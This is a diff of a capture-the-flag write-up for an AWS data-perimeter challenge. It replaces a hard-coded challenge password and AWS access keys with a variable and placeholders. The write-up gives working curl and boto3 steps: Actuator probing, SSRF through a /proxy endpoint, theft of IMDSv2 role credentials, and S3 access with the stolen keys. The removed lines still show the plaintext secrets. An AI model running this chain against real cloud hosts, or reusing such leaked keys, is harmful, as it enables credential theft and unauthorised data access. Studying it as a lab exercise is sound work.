@@ -10,7 +10,7 @@
 > After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket.  
 > It won't be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents.
 
-Access credentials for the challenge server are provided: `ctf:88sPVWyC2P3p`
+Access credentials for the challenge server are provided separately. Export the password as `CTF_PASSWORD` before running the examples.
 
 > "AWS data perimeters are a very strong security mitigation, but I wanted to show a way in which things can go wrong using an important feature of AWS that is common in larger applications, but that many do not have experience with." — Scott Piper
 
@@ -30,13 +30,13 @@ Spring Boot Actuator → /proxy SSRF → IMDSv2 credential theft
 Spring Boot Actuator is a common misconfiguration that exposes internal endpoints publicly. Start by probing:
 
 ```bash
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator
+curl -s "https://ctf:${CTF_PASSWORD}@challenge01.cloud-champions.com/actuator"
 ```
 
 The response lists all available actuator endpoints, including `/actuator/mappings`. Fetching that reveals every registered Spring MVC route:
 
 ```bash
-curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | \
+curl -s "https://ctf:${CTF_PASSWORD}@challenge01.cloud-champions.com/actuator/mappings" | \
   python3 -c "import json,sys; d=json.load(sys.stdin); \
   [print(p['requestMappingConditions']['patterns']) \
    for c in d['contexts'].values() \
@@ -55,7 +55,7 @@ EC2 instances expose instance metadata at `http://169.254.169.254`. IMDSv2 requi
 
 ```bash
 TOKEN=$(curl -s -X PUT \
-  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" \
+  "https://ctf:${CTF_PASSWORD}@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" \
   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 ```
 
@@ -63,7 +63,7 @@ TOKEN=$(curl -s -X PUT \
 
 ```bash
 ROLE=$(curl -s \
-  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
+  "https://ctf:${CTF_PASSWORD}@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
   -H "X-aws-ec2-metadata-token: $TOKEN")
 # → challenge01-5592368
 ```
@@ -72,7 +72,7 @@ ROLE=$(curl -s \
 
 ```bash
 curl -s \
-  "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" \
+  "https://ctf:${CTF_PASSWORD}@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" \
   -H "X-aws-ec2-metadata-token: $TOKEN"
 ```
 
@@ -80,8 +80,8 @@ Response (abbreviated):
 
 ```json
 {
-  "AccessKeyId": "ASIARK7LBOHXJ6HENAKW",
-  "SecretAccessKey": "jPMN5r4OZK3X8ejiS9d7VB+tf8IfWYJ5bqcmKGHF",
+  "AccessKeyId": "<REDACTED_CTF_ACCESS_KEY_ID>",
+  "SecretAccessKey": "<REDACTED_CTF_SECRET_ACCESS_KEY>",
   "Token": "IQoJb3JpZ2lu...",
   "Expiration": "2026-05-20T15:08:59Z"
 }
@@ -96,8 +96,8 @@ The instance is `i-0bfc4291dd0acd279` in account `092297851374`, running as role
 Using the stolen credentials:
 
 ```bash
-export AWS_ACCESS_KEY_ID=ASIARK7LBOHXJ6HENAKW
-export AWS_SECRET_ACCESS_KEY=jPMN5r4OZK3X8ejiS9d7VB+tf8IfWYJ5bqcmKGHF
+export AWS_ACCESS_KEY_ID="REDACTED_CTF_ACCESS_KEY_ID"
+export AWS_SECRET_ACCESS_KEY="REDACTED_CTF_SECRET_ACCESS_KEY"
 export AWS_SESSION_TOKEN=IQoJb3JpZ2lu...
 export AWS_DEFAULT_REGION=us-east-1
 
@@ -126,8 +126,8 @@ import boto3, urllib.parse, subprocess
 
 s3 = boto3.client('s3',
     region_name='us-east-1',
-    aws_access_key_id='ASIARK7LBOHXJ6HENAKW',
-    aws_secret_access_key='jPMN5r4OZK3X8ejiS9d7VB+tf8IfWYJ5bqcmKGHF',
+    aws_access_key_id='<CTF_ACCESS_KEY_ID>',
+    aws_secret_access_key='<CTF_SECRET_ACCESS_KEY>',
     aws_session_token='IQoJb3JpZ2lu...'
 )
 
